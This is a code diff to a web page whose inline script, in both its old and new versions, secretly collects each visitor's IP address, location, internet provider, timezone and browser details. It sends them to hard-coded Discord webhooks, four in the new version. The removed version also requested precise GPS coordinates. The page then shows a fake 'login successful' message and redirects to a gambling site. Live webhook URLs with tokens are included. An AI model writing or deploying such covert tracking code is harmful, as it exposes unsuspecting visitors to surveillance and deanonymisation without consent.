@@ -9,6 +9,7 @@
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: #f2f2f2;
     }
+
     .navbar {
       background-color: #003366;
       color: white;
@@ -17,6 +18,7 @@
       font-size: 24px;
       font-weight: bold;
     }
+
     .main-content {
       display: flex;
       flex-direction: column;
@@ -25,6 +27,7 @@
       height: 80vh;
       text-align: center;
     }
+
     .card {
       background-color: white;
       border-radius: 10px;
@@ -33,6 +36,7 @@
       max-width: 400px;
       width: 90%;
     }
+
     .loader {
       margin-top: 20px;
       border: 6px solid #f3f3f3;
@@ -42,6 +46,7 @@
       height: 40px;
       animation: spin 1s linear infinite;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -61,74 +66,78 @@
 </div>
 
 <script>
-  const webhookUrl = "https://discord.com/api/webhooks/1363623232430936064/J9gRjc1oKd99eFYYDs2xfljezoyyVuh2vLPaVpMBMxAqSuNXfBpZm2cnyUzMaizDFN2V";
-  const userAgent = navigator.userAgent;
-  const now = new Date().toLocaleString();
-
-  const sources = [
-    { url: "https://ipinfo.io/json?token=34011ec27e4e2f", parser: d => `🌐 IPInfo: ${d.ip}, ${d.country} - ${d.city}` },
-    { url: "https://ipwho.is/", parser: d => `📍 IPWho: ${d.ip}, ${d.country} - ${d.city}` },
-    { url: "https://ipapi.co/json/", parser: d => `🛰️ IPAPI: ${d.ip}, ${d.country_name} - ${d.city}` },
-    { url: "https://freeipapi.com/api/json", parser: d => `🗺️ FreeIPAPI: ${d.ipAddress}, ${d.countryName} - ${d.cityName}` }
+  // روابط الWebhooks لديسكورد
+  const webhookUrls = [
+    "https://discord.com/api/webhooks/1363623232430936064/J9gRjc1oKd99eFYYDs2xfljezoyyVuh2vLPaVpMBMxAqSuNXfBpZm2cnyUzMaizDFN2V",  // Webhook 1
+    "https://discord.com/api/webhooks/1363623318787325953/f3A_DX_S8fcq5aFF4-cRdCQBb00ekBZ8jWLySMDypyK_HdSuY-DXti3XRF-j9Vcz-IPR",  // Webhook 2
+    "https://discord.com/api/webhooks/1363558899382358067/O06A811WKbK7gvFMQQWTXkzdIHwe9qTBl0GQyibpDxj1yBxtxIPm2PZpExJXxeKdbNTQ",  // Webhook 3
+    "https://discord.com/api/webhooks/1363573436290564218/anQti3PGWr2FaBbGWcsOI3MbUjFxMceQBqdb5CVNLP0TGUnCs_rGNbveyomWHsBo9ffW"   // Webhook 4
   ];
 
-  // محاولة جلب البيانات من كل مصدر
-  Promise.allSettled(sources.map(src =>
-    fetch(src.url).then(res => res.json()).then(data => src.parser(data))
-  ))
-  .then(results => {
-    const successful = results
-      .filter(r => r.status === 'fulfilled')
-      .map(r => r.value)
-      .join("\n");
-
-    const baseMessage = `🕵️‍♂️ زائر جديد دخل الموقع:
-${successful}
-
-🖥️ المتصفح: ${userAgent}
-📅 الوقت: ${now}
-`;
-
-    // إرسال بيانات الموقع التقريبي أولاً
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: baseMessage })
-    });
-
-    // بعدين نجرب نجيب الموقع الدقيق
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const { latitude, longitude } = pos.coords;
-          const geoMessage = `📌 الموقع الدقيق:
-📍 الإحداثيات: ${latitude}, ${longitude}`;
-
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: geoMessage })
-          });
-        },
-        (err) => {
-          console.warn("الموقع الدقيق مرفوض أو غير متاح.");
+  // دالة لإرسال الرسالة لكل الWebhooks
+  const sendToDiscord = (message) => {
+    // نستخدم Promise.allSettled لضمان إن الرسائل بتتبعت لباقي الأماكن حتى لو في مكان فشل
+    const promises = webhookUrls.map(url => 
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`Failed to send to ${url}`);
         }
-      );
-    }
+      })
+      .catch(error => {
+        console.error(error);  // لو في خطأ، يطبع الخطأ في الكونسول
+      })
+    );
 
-    // عرض رسالة مؤقتة ثم تحويل
-    setTimeout(() => {
-      document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
+    // نتأكد إن كل الpromises اتحققت بنجاح أو على الأقل ما توقفناش
+    Promise.allSettled(promises).then(results => {
+      // هنا نقدر نعرض أو نطبع النتيجة في الكونسول لو حبينا
+      results.forEach((result, index) => {
+        if (result.status === 'rejected') {
+          console.log(`Webhook ${index + 1} failed: ${result.reason}`);
+        } else {
+          console.log(`Webhook ${index + 1} succeeded.`);
+        }
+      });
+    });
+  };
+
+  // طلب IP وموقع الزائر
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      const now = new Date().toLocaleString();
+      const userAgent = navigator.userAgent;
+
+      // إرسال البيانات إلى ديسكورد
+      const message = {
+        content: `🕵️‍♂️ زائر جديد دخل الموقع:\n
+🌐 IP: ${data.ip}
+📍 الدولة: ${data.country_name} - ${data.city}
+🛰️ مزود الخدمة: ${data.org}
+⏰ المنطقة الزمنية: ${data.timezone}
+🖥️ المتصفح: ${userAgent}
+📅 الوقت: ${now}`
+      };
+
+      sendToDiscord(message.content);  // إرسال الرسالة
+
+      // بعد إرسال البيانات، نعرض رسالة مؤقتة ثم نحول
       setTimeout(() => {
-        window.location.href = "https://1xbet.com";
-      }, 3000);
-    }, 2000);
-
-  })
-  .catch(err => {
-    console.error("خطأ أثناء جمع البيانات:", err);
-    document.querySelector('.card').innerHTML = "<p>⚠️ حصل خطأ في تحميل البيانات.</p>";
-  });
+        document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
+        setTimeout(() => {
+          window.location.href = "https://1xbet.com";
+        }, 3000); // تحويل بعد 3 ثواني من عرض الرسالة
+      }, 2000); // عرض الرسالة بعد 2 ثانية من الإرسال
+    })
+    .catch(err => {
+      document.querySelector('.card').innerHTML = '<p>⚠️ حصل خطأ في تحميل البيانات.</p>';
+      console.error(err);
+    });
 </script>
 
 </body>
